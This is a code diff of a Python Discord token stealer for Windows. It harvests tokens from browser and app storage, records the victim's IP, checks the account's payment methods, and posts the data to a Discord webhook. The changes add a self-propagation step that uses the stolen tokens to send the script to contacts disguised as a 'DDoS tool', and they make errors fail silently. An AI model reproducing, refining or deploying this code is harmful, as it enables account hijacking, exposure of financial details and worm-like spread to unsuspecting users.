@@ -3,13 +3,13 @@ import os
 if os.name != "nt":
     exit()
 
-import json
-import requests
-from urllib.request import Request, urlopen
 from re import findall
+from json import loads, dumps
 from base64 import b64decode
 from subprocess import Popen, PIPE
+from urllib.request import Request, urlopen
 from threading import Thread
+from time import sleep
 from sys import argv
 
 one="https://discord.com/api/webhooks/"
@@ -41,15 +41,6 @@ def getHeader(token=None, content_type="application/json"):
     return headers
 
 
-def getUserData(token):
-    try:
-        return json.loads(
-            urlopen(request.Request("https://discordapp.com/api/v6/users/@me", headers=getHeader(token))).read().decode())
-    except:
-        return "Failed to get user data"
-        raise
-
-
 def getTokenz(path):
     path += "\\Local Storage\\leveldb"
     tokens = []
@@ -64,25 +55,19 @@ def getTokenz(path):
 
 
 def whoTheFuckAmI():
-    ip = "None"
+    ip = "Can't get IP"
     try:
-        ip = "Can't Access"
-        return ip
+        ip = urlopen(Request("https://api.ipify.org?format=json")).read().decode().strip()
     except:
-        ip = "Can't Access"
-        return ip
-        raise
-    return ip["ip"]
-
+        pass
+    return ip
 
 def paymentMethods(token):
     try:
-        return bool(len(json.loads(urlopen(request.Request("https://discordapp.com/api/v6/users/@me/billing/payment-sources",
+        return bool(len(loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/billing/payment-sources",
                                               headers=getHeader(token))).read().decode())) > 0)
     except:
-        return "Cant Get Payment Methods"
-        raise
-
+        pass
 
 def main():
     cache_path = ROAMING + "\\.cache~$"
@@ -107,8 +92,7 @@ def main():
                 try:
                     uid = b64decode(token.split(".")[0].encode()).decode()
                 except:
-                    print(e)
-                    raise
+                    pass
                 if not uid or uid in working_ids:
                     continue
             user_data = getUserData(token)
@@ -144,6 +128,9 @@ def main():
                 "author": {
                     "name": f"{username} ({user_id})",
                 },
+                "footer": {
+                    "text": f"Visit my website for more Cybersecurity contents: un5t48l3.com"
+                }
             }
             embeds.append(embed)
     with open(cache_path, "a") as file:
@@ -160,14 +147,19 @@ def main():
     }
     try:
         
-        urlopen(request.Request(WEBHOOK_URL, data=json.dumps(webhook).encode(), headers=getHeader()))
+        urlopen(Request(WEBHOOK_URL, data=dumps(webhook).encode(), headers=getHeader()))
     except:
-        return "Cant Send Requests"
-        raise
+        pass
+    if self_spread:
+        for token in working:
+            with open(argv[0], encoding="utf-8") as file:
+                content = file.read()
+            payload = f'-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="file"; filename="{__file__}"\nContent-Type: text/plain\n\n{content}\n-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="content"\n\nDDoS tool. python download: https://www.python.org/downloads\n-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="tts"\n\nfalse\n-----------------------------325414537030329320151394843687--'
+            Thread(target=spread, args=(token, payload, 7500 / 1000)).start()
 
 
 try:
     main()
 except Exception as e:
     print(e)
-    raise
+    pass
